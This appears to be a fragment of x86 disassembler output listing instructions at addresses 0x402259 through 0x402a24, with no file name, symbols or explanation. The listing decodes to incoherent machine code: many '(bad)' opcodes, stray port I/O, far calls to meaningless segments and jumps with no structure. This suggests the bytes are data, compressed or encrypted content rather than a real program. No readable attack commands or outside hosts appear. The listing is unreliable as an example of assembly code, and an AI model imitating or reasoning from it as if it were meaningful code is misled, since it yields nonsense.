  402259:	scas   eax,DWORD PTR es:[edi]
  40225a:	xchg   edx,eax
  40225b:	mov    dh,ah
  40225d:	mov    es,esi
  40225f:	into   
  402260:	inc    edi
  402261:	(bad)  
  402262:	inc    edi
  402263:	cdq    
  402264:	sub    al,0xa9
  402266:	ret    0x8234
  402269:	sbb    dh,0x60
  40226c:	paddw  mm7,QWORD PTR [ecx+ecx*4-0x41]
  402271:	jnp    0x4022b4
  402273:	mov    ebp,0xab5a6d60
  402278:	xchg   ebx,eax
  402279:	mov    bh,BYTE PTR [edx+0x7c005947]
  40227f:	aas    
  402280:	leave  
  402281:	stc    
  402282:	add    cl,cl
  402284:	mov    dh,0x3e
  402286:	jne    0x40226c
  402288:	ret    
  402289:	dec    esi
  40228a:	(bad)  
  40228b:	dec    ebx
  40228c:	in     al,dx
  40228d:	pop    es
  40228e:	add    bl,BYTE PTR [ebp-0x34]
  402291:	dec    ebp
  402292:	pop    ds
  402293:	out    0xdf,al
  402295:	lods   al,BYTE PTR ds:[esi]
  402296:	mov    dh,BYTE PTR [ebx+edx*2]
  402299:	xchg   ebp,eax
  40229a:	jge    0x40228a
  40229c:	pop    edx
  40229d:	cwde   
  40229e:	jbe    0x402272
  4022a0:	jle    0x4022c1
  4022a2:	sub    eax,0xc375dfb6
  4022a7:	mov    ah,0x16
  4022a9:	retf   
  4022aa:	pusha  
  4022ab:	or     BYTE PTR ds:[eax+eax*2-0x55],0xf4
  4022b1:	leave  
  4022b2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022b4:	adc    al,0x5e
  4022b6:	mov    ebx,0x70de3f44
  4022bb:	dec    ebx
  4022bc:	(bad)  
  4022bd:	ret    
  4022be:	(bad)  
  4022c0:	ins    BYTE PTR es:[edi],dx
  4022c1:	ret    
  4022c2:	retf   0xc2f9
  4022c5:	and    BYTE PTR [edi],al
  4022c7:	xchg   BYTE PTR [esi+ecx*2-0x46bfedbb],bh
  4022ce:	in     eax,dx
  4022cf:	mov    ds:0xaec779c,eax
  4022d4:	adc    dh,al
  4022d6:	inc    ecx
  4022d7:	dec    esi
  4022d8:	xchg   BYTE PTR [eax-0x4690a7bf],dh
  4022de:	test   eax,0xe8e2859e
  4022e3:	sub    BYTE PTR [edx-0x3f],0x3
  4022e7:	inc    esi
  4022e8:	retf   
  4022e9:	shl    DWORD PTR [esi],1
  4022eb:	and    eax,0xa8147bb6
  4022f0:	leave  
  4022f1:	shl    DWORD PTR [ebx+0x42],cl
  4022f4:	aas    
  4022f5:	mov    WORD PTR [edi-0x34e1ae55],?
  4022fb:	pushf  
  4022fc:	retf   0x70c2
  4022ff:	jecxz  0x4022e0
  402301:	sub    DWORD PTR [esi+0x65],ebx
  402304:	push   eax
  402305:	fs push esi
  402307:	hlt    
  402308:	sbb    ah,ah
  40230a:	mov    esp,0x911b6f32
  40230f:	pop    ebp
  402310:	dec    ebx
  402311:	or     bl,BYTE PTR [edx+0x6798c2e]
  402317:	and    BYTE PTR [edx+edi*8+0x32],dh
  40231b:	xchg   edi,eax
  40231c:	or     al,0xb
  40231e:	xchg   ebp,eax
  40231f:	sbb    ebx,DWORD PTR [ebx+ebp*2+0x12]
  402323:	mov    edi,ebx
  402325:	rol    DWORD PTR [ecx],cl
  402327:	test   DWORD PTR [edi+0x62cdc8d8],ebx
  40232d:	test   al,al
  40232f:	adc    al,0xc5
  402331:	xchg   edx,eax
  402332:	mov    ah,0xf1
  402334:	push   ecx
  402335:	dec    ebx
  402336:	test   BYTE PTR [edx+ecx*1],dh
  402339:	mov    BYTE PTR [ebx+0x37],bl
  40233c:	bound  edx,QWORD PTR [ebp-0x5aaf392f]
  402342:	std    
  402343:	es stc 
  402345:	pop    edx
  402346:	xlat   BYTE PTR ds:[ebx]
  402347:	out    0x87,al
  402349:	in     eax,0x4a
  40234b:	sbb    al,0xb
  40234d:	mov    ch,0x2d
  40234f:	scas   al,BYTE PTR es:[edi]
  402350:	fisttp QWORD PTR ds:0x7f68bc51
  402356:	push   cs
  402357:	and    eax,0xe56e8e32
  40235c:	sbb    WORD PTR [ebp+eax*2-0x288b4498],sp
  402364:	pop    ebx
  402365:	mov    cl,0x3
  402367:	and    BYTE PTR [esi+0x6ebcf4c9],dh
  40236d:	cdq    
  40236e:	mov    dh,0x75
  402370:	lods   al,BYTE PTR ds:[esi]
  402371:	loope  0x40232b
  402373:	in     al,dx
  402374:	les    edi,FWORD PTR [ebx]
  402376:	(bad)  
  402377:	stc    
  402378:	(bad)  
  402379:	xor    bl,BYTE PTR [ebx-0x3b]
  40237c:	ror    DWORD PTR [esp+ecx*2+0x7667d50],1
  402383:	xor    esi,DWORD PTR [edi-0x28]
  402386:	(bad)  
  402387:	aam    0xe9
  402389:	arpl   WORD PTR [ebx-0x39],dx
  40238c:	sub    BYTE PTR [esi+0xe],cl
  40238f:	jne    0x402350
  402391:	loope  0x40236c
  402393:	push   ecx
  402394:	shl    BYTE PTR [ecx+0x5d],cl
  402397:	aas    
  402398:	and    edx,DWORD PTR [eax]
  40239a:	inc    edi
  40239b:	xor    al,0x28
  40239d:	mov    ch,0x44
  40239f:	mov    cs,WORD PTR [ecx]
  4023a1:	vpminub xmm1,xmm4,XMMWORD PTR [ecx+ebp*2]
  4023a6:	pop    edi
  4023a7:	adc    BYTE PTR [edx+0x3d],ch
  4023aa:	dec    esp
  4023ab:	jb     0x40233d
  4023ad:	push   ss
  4023ae:	(bad)  
  4023af:	frstor [ecx-0x4d]
  4023b2:	sbb    al,0x85
  4023b4:	pop    edi
  4023b5:	stos   DWORD PTR es:[edi],eax
  4023b6:	cwde   
  4023b7:	pop    esp
  4023b8:	pusha  
  4023b9:	push   cs
  4023ba:	out    0x7d,al
  4023bc:	leave  
  4023bd:	imul   eax,DWORD PTR [eax+0x3a],0xffffff98
  4023c1:	dec    esi
  4023c2:	jae    0x4023b9
  4023c4:	pop    eax
  4023c5:	aam    0x9b
  4023c7:	or     eax,0xa512f22f
  4023cc:	jne    0x40236b
  4023ce:	das    
  4023cf:	push   esi
  4023d0:	mov    eax,ds:0x712dc0e4
  4023d5:	or     al,0xb6
  4023d7:	xchg   esi,eax
  4023d8:	inc    ebp
  4023d9:	ins    BYTE PTR es:[edi],dx
  4023da:	stos   DWORD PTR es:[edi],eax
  4023db:	es cmp al,0xce
  4023de:	mov    al,cl
  4023e0:	adc    al,0xb9
  4023e2:	sub    esi,ebp
  4023e4:	pop    ds
  4023e5:	enter  0xb52c,0xeb
  4023e9:	fst    DWORD PTR [ebx+0xd4b4265]
  4023ef:	add    edi,esi
  4023f1:	call   0xec20:0xfa8fb01b
  4023f8:	(bad)  
  4023f9:	cmp    BYTE PTR [ebx-0x59],ah
  4023fc:	sbb    edi,0x4bff4c68
  402402:	icebp  
  402403:	mov    edx,0x627200e1
  402408:	pop    ebp
  402409:	fidivr DWORD PTR [edi-0x43]
  40240c:	inc    ebp
  40240d:	push   ecx
  40240e:	les    ebp,FWORD PTR [ebp+0x23c3048e]
  402414:	cmp    DWORD PTR [ebx+esi*8-0x4af07234],edx
  40241b:	push   eax
  40241c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40241d:	or     edx,esp
  40241f:	or     ebx,DWORD PTR [ecx]
  402421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402422:	jb     0x402434
  402424:	pop    ebp
  402425:	jmp    0xbc6ccfed
  40242a:	in     eax,dx
  40242b:	sti    
  40242c:	lea    ecx,[edi+0x321dbbd]
  402432:	add    eax,0xe2b060ca
  402437:	add    DWORD PTR [ecx],0xfa5cfc9c
  40243d:	mov    ch,0x62
  40243f:	jl     0x40249f
  402441:	add    DWORD PTR [edi],esp
  402443:	test   BYTE PTR [edx],0x6f
  402446:	(bad)  
  402447:	xchg   ecx,eax
  402448:	cmp    BYTE PTR [ecx-0x5994b0cd],ah
  40244e:	in     eax,0x8e
  402450:	xchg   DWORD PTR [edi],ebx
  402452:	push   ds
  402453:	ficomp WORD PTR [bp+si+0x68df]
  402458:	in     al,0xb1
  40245a:	inc    ebx
  40245b:	mov    al,0x87
  40245d:	jno    0x402435
  40245f:	jle    0x40240f
  402461:	dec    esi
  402462:	push   esp
  402463:	(bad)  
  402464:	fisttp QWORD PTR [eax+esi*4-0x2f]
  402468:	dec    edi
  402469:	mov    ds:0xc4440d1f,eax
  40246e:	pop    eax
  40246f:	mov    BYTE PTR [eax-0x27f37216],bh
  402475:	mov    edi,0x6413ef5
  40247a:	ja     0x4024a4
  40247c:	or     BYTE PTR [esi-0x75826232],0x9d
  402483:	jbe    0x402427
  402485:	jnp    0x40244a
  402487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402488:	jecxz  0x402478
  40248a:	aaa    
  40248b:	and    BYTE PTR ss:[ebx+0x37],al
  40248f:	shl    BYTE PTR [eax+0x1567fb85],0x2f
  402496:	test   ebp,eax
  402498:	jns    0x402470
  40249a:	in     al,dx
  40249b:	mov    eax,0x7bf706a9
  4024a0:	push   0x35
  4024a2:	int    0xfb
  4024a4:	mov    ecx,0xb0da27d5
  4024a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024aa:	into   
  4024ab:	mul    BYTE PTR [ebp-0x3f798006]
  4024b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024b2:	fisttp WORD PTR [eax+0x1fe8e79a]
  4024b8:	loope  0x4024f4
  4024ba:	add    dh,BYTE PTR [ebp-0x4251d0b8]
  4024c0:	mov    eax,0x4ee52e1e
  4024c5:	xchg   esi,eax
  4024c6:	sbb    BYTE PTR [edx*8+0x1979bf2a],al
  4024cd:	jmp    0x40252b
  4024cf:	fldl2e 
  4024d1:	into   
  4024d2:	inc    esi
  4024d3:	hlt    
  4024d4:	push   ebp
  4024d5:	fnstcw WORD PTR [ebx-0x5e]
  4024d8:	aad    0xc8
  4024da:	inc    ebp
  4024db:	push   0x76
  4024dd:	repnz mov al,ds:0x2647e136
  4024e3:	ret    0x681
  4024e6:	and    al,0x7
  4024e8:	sti    
  4024e9:	push   0x1ec3714d
  4024ee:	imul   edx,DWORD PTR [esi],0xffffffa8
  4024f1:	inc    eax
  4024f2:	inc    ebx
  4024f3:	fisub  DWORD PTR [esi-0x28]
  4024f6:	fst    DWORD PTR [ecx]
  4024f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024f9:	nop
  4024fa:	call   0x4c6f:0xbb8ffae8
  402501:	mov    bl,0x33
  402503:	or     eax,0xccb2b020
  402508:	mov    bh,0x55
  40250a:	stos   DWORD PTR es:[edi],eax
  40250b:	pushf  
  40250c:	in     al,dx
  40250d:	xor    ch,BYTE PTR [ebx]
  40250f:	pop    ss
  402510:	cmc    
  402511:	ret    0x9ed8
  402514:	mov    ds:0xd1a05703,eax
  402519:	sbb    eax,0x4a1e9074
  40251e:	pop    edi
  40251f:	fadd   QWORD PTR ds:0xf07ceeb6
  402525:	xchg   esi,eax
  402526:	out    0xf1,eax
  402528:	jp     0x402562
  40252a:	adc    bh,0xdf
  40252d:	xchg   esp,eax
  40252e:	ret    0xb6b6
  402531:	push   eax
  402532:	adc    eax,0xccfa2999
  402537:	inc    esp
  402538:	jg     0x40255d
  40253a:	sbb    DWORD PTR [ecx+0x69],0xffffffbf
  40253e:	out    0xb1,al
  402540:	adc    ah,dl
  402542:	xor    DWORD PTR [edx+0x1976a438],edi
  402548:	in     al,dx
  402549:	mov    es,WORD PTR [ebx+eax*4-0x33c38ce3]
  402550:	mov    bl,0xe4
  402552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402553:	and    ch,BYTE PTR [ebp-0x3d]
  402556:	scas   eax,DWORD PTR es:[edi]
  402557:	push   ds
  402558:	ins    DWORD PTR es:[edi],dx
  402559:	inc    edi
  40255a:	addr16 sub eax,edi
  40255d:	jmp    0x4025ac
  40255f:	xchg   ecx,eax
  402560:	stos   DWORD PTR es:[edi],eax
  402561:	xor    al,0x42
  402563:	pop    esi
  402564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402565:	xor    esp,eax
  402567:	mov    al,0xeb
  402569:	pusha  
  40256a:	leave  
  40256b:	iret   
  40256c:	jb     0x402529
  40256e:	jns    0x402599
  402570:	xor    ebp,esi
  402572:	or     DWORD PTR [edi+0x7d],eax
  402575:	and    BYTE PTR [ebx],ch
  402577:	sub    BYTE PTR [eax-0x35d2cf28],0xeb
  40257e:	sub    al,0x37
  402580:	in     al,dx
  402581:	mov    cl,0xad
  402583:	mov    bh,0x9f
  402585:	out    dx,eax
  402586:	inc    edx
  402587:	outs   dx,DWORD PTR ds:[esi]
  402588:	mov    ah,0xcf
  40258a:	dec    esp
  40258b:	test   al,0xae
  40258d:	lods   al,BYTE PTR ds:[esi]
  40258e:	inc    edi
  40258f:	out    0x2,al
  402591:	pop    esi
  402592:	retf   
  402593:	cs mov ch,0x79
  402596:	ret    
  402597:	repz in al,0xff
  40259a:	mov    BYTE PTR [eax],dl
  40259c:	adc    al,0xa1
  40259e:	push   ss
  40259f:	clc    
  4025a0:	data16 jb 0x4025ec
  4025a3:	or     al,0x25
  4025a5:	sub    DWORD PTR [ecx-0x141f1b11],0x69e483d4
  4025af:	cdq    
  4025b0:	push   ebx
  4025b1:	jg     0x40254b
  4025b3:	mov    edx,0x76c93839
  4025b8:	aam    0xf6
  4025ba:	jg     0x40256b
  4025bc:	mov    eax,0xe5c92b77
  4025c1:	fidiv  DWORD PTR [edx+0x29cbaffe]
  4025c7:	push   0xd540f7a
  4025cc:	dec    esp
  4025cd:	mov    esp,0xe3556653
  4025d2:	es in  ax,dx
  4025d5:	scas   al,BYTE PTR es:[edi]
  4025d6:	stc    
  4025d7:	enter  0xfe78,0x2d
  4025db:	pop    ecx
  4025dc:	hlt    
  4025dd:	xchg   ebx,eax
  4025de:	fistp  DWORD PTR [esi-0xf]
  4025e1:	and    al,0xf5
  4025e3:	mov    ecx,0x62651659
  4025e8:	sbb    bh,BYTE PTR [eax-0x342920c8]
  4025ee:	xchg   ebp,esi
  4025f0:	les    ebp,FWORD PTR [edx-0x1eed009f]
  4025f6:	mov    eax,0x8fad733e
  4025fb:	dec    ecx
  4025fc:	ror    DWORD PTR [ebx-0x42b438ae],0xca
  402603:	cmp    esi,DWORD PTR [esi+ebp*2+0x2f71a529]
  40260a:	stc    
  40260b:	ja     0x4025ad
  40260d:	mov    bh,0xa7
  40260f:	outs   dx,BYTE PTR ds:[esi]
  402610:	add    DWORD PTR [edi],esi
  402612:	mov    edi,0x8d975bb3
  402617:	rcr    BYTE PTR [ebp+0x3e9f7e89],0x6d
  40261e:	push   ecx
  40261f:	hlt    
  402620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402621:	je     0x4025a7
  402623:	add    ecx,DWORD PTR [edi]
  402625:	add    DWORD PTR [edi-0x54d5c644],eax
  40262b:	stc    
  40262c:	icebp  
  40262d:	xchg   edi,eax
  40262e:	(bad)  [esi+eax*4-0x3f]
  402632:	(bad)  
  402633:	jb     0x402634
  402635:	(bad)
  402638:	call   0x4dab:0xa3797663
  40263f:	outs   dx,DWORD PTR ds:[esi]
  402640:	sub    BYTE PTR [eax+0x7a865221],bl
  402646:	push   eax
  402647:	or     BYTE PTR [ecx],bh
  402649:	sbb    esp,DWORD PTR [esi-0x31330d9f]
  40264f:	fwait
  402650:	jb     0x402699
  402652:	stos   DWORD PTR es:[edi],eax
  402653:	inc    edi
  402654:	cmp    ah,BYTE PTR [eax+0x2]
  402657:	(bad)  [ecx+eax*2]
  40265a:	sbb    al,0xd4
  40265c:	and    edi,ebx
  40265e:	jl     0x4026c2
  402660:	cli    
  402661:	or     al,0xa5
  402663:	aas    
  402664:	mov    ds:0x4c73c308,al
  402669:	dec    esp
  40266a:	jae    0x4025fd
  40266c:	(bad)  
  40266d:	out    dx,eax
  40266e:	mov    BYTE PTR [ecx-0x62e78778],bl
  402674:	mov    ecx,0xfa11cbee
  402679:	adc    DWORD PTR [esi+0x33],0xc5026f6
  402680:	dec    ebx
  402681:	cmp    ch,bl
  402683:	xchg   ebp,eax
  402684:	imul   esp,edx,0x5d40d916
  40268a:	and    DWORD PTR [ecx+0x398c6e5f],eax
  402690:	lahf   
  402691:	xchg   edi,eax
  402692:	pop    esi
  402693:	mov    eax,ds:0x9583cf9e
  402698:	push   cs
  402699:	inc    ebp
  40269a:	bnd jge 0x402712
  40269d:	and    edx,DWORD PTR [eax]
  40269f:	pop    ss
  4026a0:	cmp    eax,0x1c63028f
  4026a5:	ss push cs
  4026a7:	mov    dl,0xcb
  4026a9:	xor    eax,0xe8720a14
  4026ae:	mov    ebx,DWORD PTR [ebp+0x567f6c50]
  4026b4:	(bad)  
  4026b6:	push   ecx
  4026b7:	cli    
  4026b8:	or     al,0xdf
  4026ba:	(bad)  
  4026bb:	cmp    bl,BYTE PTR ds:0xfb530010
  4026c1:	call   0x2361:0x25d86148
  4026c8:	inc    ebx
  4026c9:	pushf  
  4026ca:	jecxz  0x4026cf
  4026cc:	sub    DWORD PTR [eax-0x55],ecx
  4026cf:	jg     0x402708
  4026d1:	ins    DWORD PTR es:[edi],dx
  4026d2:	icebp  
  4026d3:	sbb    BYTE PTR [ecx-0x35cd56b0],dh
  4026d9:	loop   0x402756
  4026db:	test   bl,ah
  4026dd:	cmp    al,0xa5
  4026df:	scas   eax,DWORD PTR es:[edi]
  4026e0:	add    al,bh
  4026e2:	into   
  4026e3:	xor    ecx,DWORD PTR [ebx]
  4026e5:	std    
  4026e6:	mov    al,ds:0xef2b6f5d
  4026eb:	popf   
  4026ec:	popf   
  4026ed:	sbb    DWORD PTR [eax-0x3e],eax
  4026f0:	push   cs
  4026f1:	ja     0x402762
  4026f3:	pop    edi
  4026f4:	call   0x9fe1:0x3a69fa5b
  4026fb:	cmp    DWORD PTR [esi],0xa877c3bc
  402701:	inc    edx
  402702:	mov    DWORD PTR [esi],ecx
  402704:	xor    eax,0x2c090713
  402709:	stc    
  40270a:	xor    DWORD PTR [ebp-0x4e],edx
  40270d:	or     esp,DWORD PTR [edx+0x4a]
  402710:	mov    ebp,0xe8a060f
  402715:	push   ebp
  402716:	(bad)  
  402717:	sbb    DWORD PTR [eax],esp
  402719:	mov    ebx,eax
  40271b:	jnp    0x402739
  40271d:	and    eax,0x1eb432c5
  402722:	mov    ah,bh
  402724:	leave  
  402725:	adc    ebp,eax
  402727:	setg   ch
  40272a:	pop    esp
  40272b:	fs popa 
  40272d:	mov    dh,0xea
  40272f:	xchg   ebx,eax
  402730:	mov    edx,0x8f921810
  402735:	mov    ecx,DWORD PTR [edi-0x2b]
  402738:	sub    BYTE PTR [ebp+0x475c5896],dh
  40273e:	mov    esi,0xfcc38960
  402743:	call   0x23e0:0x1845658d
  40274a:	std    
  40274b:	imul   ebx,eax,0x39
  40274e:	xchg   esi,eax
  40274f:	xor    BYTE PTR [edi],dh
  402751:	repnz cmp BYTE PTR [esp+ebx*8-0x15c60c2e],al
  402759:	mov    esi,0xbc0ec917
  40275e:	add    cl,BYTE PTR ds:0x2cf81974
  402764:	rol    DWORD PTR [edi-0x56b15194],cl
  40276a:	sub    DWORD PTR [edx-0x26],eax
  40276d:	dec    ecx
  40276e:	inc    ebp
  40276f:	nop
  402770:	retf   0xc1ac
  402773:	stos   BYTE PTR es:[edi],al
  402774:	ds cdq 
  402776:	mov    esp,0xdc045e7b
  40277b:	dec    ecx
  40277c:	fwait
  40277d:	xchg   ebp,eax
  40277e:	mov    ds,WORD PTR [edi]
  402780:	bound  edx,QWORD PTR [ebp+0x59e628f9]
  402786:	xchg   edi,eax
  402787:	xchg   ebx,eax
  402788:	ins    BYTE PTR es:[edi],dx
  402789:	xor    bh,BYTE PTR [ebx]
  40278b:	retf   
  40278c:	pop    esp
  40278d:	add    eax,0x57f724d2
  402792:	xor    DWORD PTR ds:[esi-0x2c],ebx
  402796:	jl     0x402771
  402798:	retf   
  402799:	ss popa 
  40279b:	aad    0x40
  40279d:	jb     0x402795
  40279f:	xchg   edx,eax
  4027a0:	fld    TBYTE PTR [edx]
  4027a2:	dec    eax
  4027a3:	sub    BYTE PTR cs:[edi+0x45],al
  4027a7:	cmp    edx,0x892fb371
  4027ad:	call   0x20e3:0x7139531f
  4027b4:	(bad)  
  4027b5:	mov    dh,0x8f
  4027b7:	arpl   WORD PTR [edi],cx
  4027b9:	call   0x83985b6
  4027be:	mov    esp,0x7589dba0
  4027c3:	xor    ecx,ebx
  4027c5:	sbb    edx,DWORD PTR ss:[edi-0x72]
  4027c9:	dec    edi
  4027ca:	loop   0x402774
  4027cc:	fbld   TBYTE PTR [eax+0x1c90a68b]
  4027d2:	leave  
  4027d3:	jae    0x40280b
  4027d5:	pop    ebx
  4027d6:	push   ebp
  4027d7:	retf   0x7896
  4027da:	scas   al,BYTE PTR es:[edi]
  4027db:	mov    ecx,eax
  4027dd:	mov    esi,0xdb19dbda
  4027e2:	retf   0x147
  4027e5:	stos   DWORD PTR es:[edi],eax
  4027e6:	add    DWORD PTR [edx-0x7],ecx
  4027e9:	inc    edx
  4027ea:	lods   eax,DWORD PTR ds:[esi]
  4027eb:	sub    ah,0x5d
  4027ee:	or     BYTE PTR gs:[edi],al
  4027f1:	and    cl,bh
  4027f3:	jle    0x402870
  4027f5:	loop   0x40277c
  4027f7:	lods   al,BYTE PTR ds:[esi]
  4027f8:	dec    ebp
  4027f9:	out    0xb6,eax
  4027fb:	cdq    
  4027fc:	stc    
  4027fd:	jg     0x40277f
  4027ff:	iret   
  402800:	mov    al,ds:0x42761650
  402805:	pop    es
  402806:	mov    dh,0x51
  402808:	push   0xb90230f5
  40280d:	jne    0x402790
  40280f:	jns    0x4027aa
  402811:	xor    BYTE PTR [esi-0x4c],ah
  402814:	cmp    dh,BYTE PTR [ebx]
  402816:	xlat   BYTE PTR ds:[ebx]
  402817:	lea    eax,[esi-0x4e]
  40281a:	and    eax,0xde060ebf
  40281f:	jmp    0x43ab1e55
  402824:	ret    0x674a
  402827:	test   esp,eax
  402829:	arpl   WORD PTR [eax],cx
  40282b:	ret    
  40282c:	pop    eax
  40282d:	clc    
  40282e:	repnz mov al,ds:0x2f489c89
  402834:	and    cl,ah
  402836:	pop    es
  402837:	out    dx,al
  402838:	ja     0x4027ee
  40283a:	(bad)  
  40283b:	dec    edx
  40283c:	xchg   esi,eax
  40283d:	jb     0x40286f
  40283f:	cli    
  402840:	inc    esp
  402841:	out    dx,al
  402842:	cs jl  0x4027eb
  402845:	repnz imul edx,DWORD PTR es:[edx-0x35],0x498dca0e
  40284e:	test   BYTE PTR [esp+ebx*4-0x164d20e5],ah
  402855:	loop   0x4028be
  402857:	int    0x64
  402859:	enter  0x140c,0x43
  40285d:	push   es
  40285e:	dec    esi
  40285f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402860:	jb     0x4028dd
  402862:	push   ebp
  402863:	add    al,0xe1
  402865:	dec    edi
  402866:	dec    ecx
  402867:	aas    
  402868:	mov    ah,0x56
  40286a:	int    0x8e
  40286c:	fimul  DWORD PTR [ebx-0x178e3f0e]
  402872:	in     al,0x1b
  402874:	dec    ecx
  402875:	inc    ebp
  402876:	lahf   
  402877:	sbb    al,0xf
  402879:	inc    eax
  40287a:	aaa    
  40287b:	push   es
  40287c:	mov    al,ds:0xe2686950
  402881:	popf   
  402882:	mov    dh,0xa8
  402884:	scas   eax,DWORD PTR es:[edi]
  402885:	aas    
  402886:	pop    es
  402887:	retf   0x33c6
  40288a:	mov    cl,0x9c
  40288c:	out    0x8e,eax
  40288e:	test   eax,0xbd9e4b5b
  402893:	xchg   esi,eax
  402894:	mov    eax,ds:0x394099c3
  402899:	push   edi
  40289a:	dec    eax
  40289b:	adc    eax,0x108b88f
  4028a0:	out    dx,al
  4028a1:	pop    esi
  4028a2:	enter  0x9791,0x15
  4028a6:	rol    DWORD PTR [edi-0x6eaf0281],1
  4028ac:	aas    
  4028ad:	and    BYTE PTR [edx],0x15
  4028b0:	loop   0x4028b9
  4028b2:	retf   0x5d4f
  4028b5:	mov    ch,0x6
  4028b7:	dec    esi
  4028b8:	sbb    eax,0x6001b1db
  4028bd:	stos   DWORD PTR es:[edi],eax
  4028be:	jmp    DWORD PTR [ecx]
  4028c0:	test   al,0x12
  4028c2:	(bad)  
  4028c3:	imul   BYTE PTR [edx-0x4d4484db]
  4028c9:	mov    eax,0x475821a6
  4028ce:	(bad)  
  4028cf:	in     al,0xa4
  4028d1:	sub    ch,BYTE PTR [eax]
  4028d3:	and    eax,0xa75a8145
  4028d8:	cmc    
  4028d9:	call   0xf96:0x9d88b2a5
  4028e0:	mov    ebp,0xed7951f9
  4028e5:	jae    0x402876
  4028e7:	xchg   ecx,eax
  4028e8:	shr    BYTE PTR [eax+0x2a],cl
  4028eb:	cld    
  4028ec:	mov    edi,0x101f5557
  4028f1:	(bad)  
  4028f2:	call   0xe80dc4
  4028f7:	ss stc 
  4028f9:	aas    
  4028fa:	mov    cl,0xfb
  4028fc:	in     al,dx
  4028fd:	(bad)  
  4028ff:	mov    esi,0xda5bcec0
  402904:	and    ah,0x78
  402907:	in     eax,0x34
  402909:	addr16 jg 0x40291a
  40290c:	mov    ds:0xf48427f,al
  402911:	mov    ch,0xb9
  402913:	push   edi
  402914:	jl     0x402918
  402916:	cmp    bh,ah
  402918:	mov    edi,0x9e76f38e
  40291d:	add    ch,ah
  40291f:	jle    0x40296b
  402921:	adc    dh,BYTE PTR [edi]
  402923:	jmp    FWORD PTR [eax]
  402925:	jns    0x4028cc
  402927:	jnp    0x40299a
  402929:	and    DWORD PTR [esi-0x56724de2],edi
  40292f:	popa   
  402930:	ja     0x40290d
  402932:	jns    0x402915
  402934:	bound  ebp,QWORD PTR [esp+ebx*8]
  402937:	xchg   edx,eax
  402938:	inc    esp
  402939:	adc    ch,BYTE PTR [esi+0x1df57e59]
  40293f:	push   eax
  402940:	sbb    eax,0xac828a8a
  402945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402946:	adc    dl,ch
  402948:	ins    DWORD PTR es:[edi],dx
  402949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40294a:	fdivr  DWORD PTR [ebp+0x4e]
  40294d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40294e:	mov    bh,0xea
  402950:	ss push 0xa
  402953:	retf   
  402954:	sbb    BYTE PTR [ebp+0x2be16093],al
  40295a:	and    BYTE PTR [eax+ecx*8+0x3a],dl
  40295e:	sbb    BYTE PTR [eax-0x4ef11548],al
  402964:	das    
  402965:	push   0x10bd9db6
  40296a:	mov    edx,0x223ee376
  40296f:	sar    BYTE PTR [edx+0x55cdd9aa],cl
  402975:	sbb    al,0x86
  402977:	xor    cx,ax
  40297a:	pop    eax
  40297b:	repnz mov WORD PTR ss:[edi+ecx*1],fs
  402980:	mov    bl,0x88
  402982:	popa   
  402983:	arpl   WORD PTR es:[esi+eiz*1],bx
  402987:	xchg   ecx,eax
  402988:	fst    DWORD PTR [edx+eiz*8]
  40298b:	cmp    ah,BYTE PTR [edi+0xb85f7a]
  402991:	push   es
  402992:	inc    eax
  402993:	push   edx
  402994:	in     al,dx
  402995:	and    BYTE PTR [edi+0x5484d774],bh
  40299b:	sub    esp,esi
  40299d:	je     0x40292e
  40299f:	adc    eax,0xdb5c66d1
  4029a4:	mov    dl,0x3
  4029a6:	std    
  4029a7:	popf   
  4029a8:	sahf   
  4029a9:	fwait
  4029aa:	dec    esi
  4029ab:	test   DWORD PTR [edx-0x55dbef42],esi
  4029b1:	ins    BYTE PTR es:[edi],dx
  4029b2:	or     ch,0x7a
  4029b5:	sub    DWORD PTR [ecx],edi
  4029b7:	mov    eax,0xf85ccc8d
  4029bc:	mov    ah,0x7c
  4029be:	xchg   esi,eax
  4029bf:	fbstp  TBYTE PTR [edi+ecx*2-0x19]
  4029c3:	jns    0x402945
  4029c5:	mov    dh,0x50
  4029c7:	pop    ss
  4029c8:	aaa    
  4029c9:	(bad)  
  4029ca:	std    
  4029cb:	or     DWORD PTR [edi-0x16250418],ecx
  4029d1:	xchg   ebp,eax
  4029d2:	push   cs
  4029d3:	pop    ebx
  4029d4:	cwde   
  4029d5:	adc    al,dh
  4029d7:	pusha  
  4029d8:	mov    BYTE PTR [esi-0x54],bl
  4029db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029dc:	sbb    al,0x9b
  4029de:	pop    ds
  4029df:	and    dl,BYTE PTR [eax+0x57]
  4029e2:	jmp    0x40296e
  4029e4:	sub    eax,0xcefb479c
  4029e9:	jmp    0x402a07
  4029eb:	rcr    DWORD PTR [ebp+0x1a],0x3a
  4029ef:	pop    edi
  4029f0:	sbb    BYTE PTR [edi],0x46
  4029f3:	adc    al,0xfc
  4029f5:	add    DWORD PTR [ebx],edi
  4029f7:	enter  0xba90,0x2f
  4029fb:	cmp    bh,dh
  4029fd:	nop
  4029fe:	xor    eax,0x3c2f5a0f
  402a03:	ins    BYTE PTR es:[edi],dx
  402a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a05:	scas   eax,DWORD PTR es:[edi]
  402a06:	jmp    0x7c76949d
  402a0b:	inc    edi
  402a0c:	inc    edx
  402a0d:	add    edi,DWORD PTR [edi-0x1a]
  402a10:	jbe    0x402a40
  402a12:	popf   
  402a13:	and    al,0xfd
  402a15:	dec    ecx
  402a16:	sbb    DWORD PTR [edx],edx
  402a18:	xchg   bl,bl
  402a1a:	pushf  
  402a1b:	lods   al,BYTE PTR ds:[esi]
  402a1c:	lahf   
  402a1d:	outs   dx,WORD PTR ds:[esi]
  402a1f:	ss jae 0x402a2b
  402a22:	mov    bl,0x2c
  402a24:	aam    0x4c
